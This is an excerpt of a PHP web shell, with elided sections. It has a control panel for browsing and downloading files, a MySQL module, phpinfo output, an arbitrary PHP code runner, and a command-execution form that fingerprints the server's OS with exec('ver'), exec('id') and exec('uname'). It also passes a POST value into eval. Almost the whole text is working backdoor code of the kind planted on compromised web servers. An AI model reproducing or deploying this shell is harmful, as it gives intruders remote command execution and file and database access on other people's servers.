...
// Modules supported
$modules = ['browse' => 'File browser', 'mysql' => 'MySQL'];
// Script version
...
if (get_magic_quotes_gpc()) {
    foreach (['_POST', '_GET', '_FILES', '_COOKIE'] as $ar) {
...
if ('toolz' == $_POST['act'] && 'phpinfo' == $_POST['subact']) {
    die(phpinfo());
}

if ('downfile' == $_POST['act']) {
    $curdir = $_POST['curdir'];
    $file = $_POST['file'];
...
if ('preview' == $_POST['act']) {
    ...
    if (in_array($ext, ['png', 'jpg', 'jpeg', 'bmp', 'gif', 'tiff', 'pcx'])) {
        header("Content-Type: image/$ext");
    } elseif (in_array($ext, ['htm', 'html', 'plg'])) {
...
foreach ($modules as $module => $name) {
    if (function_exists('mod_' . $module)) {
        echo '</b><td><b>';
        post_form($name, ['act' => $module], '', ' |');
        $mod_loaded[] = $module;
    }
}

echo '</b><td><b>';
post_form('Toolz', ['act' => 'toolz']);
...
if (1 == $safe) {
    ...
    $ver = exec('ver');
    if ('Microsoft' == substr($ver, 0, 9)) {
        echo $ver;
        $os = 'win';
    } else {
        $id = exec('id');
        if ('uid' == substr($id, 0, 3)) {
            echo exec('uname -srn');
            $os = 'nix';
        } else {
...
<h3>Tools</h3>
<?php
$n1 = post_empty_form(['act' => 'toolz', 'subact' => 'phpinfo']);
    $n2 = post_empty_form(['act' => 'toolz', 'subact' => 'phpcode']); ?>
<ul>
...
if ('phpcode' == $_POST['subact']) {
    ...
    echo "<br /><form method='post' name='phpcode'>
        ...
        <input type='checkbox' name='pre'" . (('on' == $_POST['pre']) ? ' checked' : '') . ">
...
<?php
    ...
    eval('mod_' . $_POST['act'] . '();');
} elseif ('load_modules' == $_POST['act']) {
    echo '<h3>Module loader</h3>';
    if ('autoload' == $_POST['subact']) {
        ...
        foreach ($modules as $module => $name) {
            $mod_form[$module] = post_empty_form(['act' => 'load_modules', 'subact' => 'autoload', 'module' => $module]);
        }
        echo '<table border=0>';
        foreach ($modules as $module => $name) {
...
<tr><td><a href="#" onClick="document.execform.stderr.checked=!document.execform.stderr.checked">Disable stderr-grabbing?</a><td><input type="checkbox" name="stderr"<?php echo ('on' == $_POST['stderr']) ? ' checked' : ''; ?>>
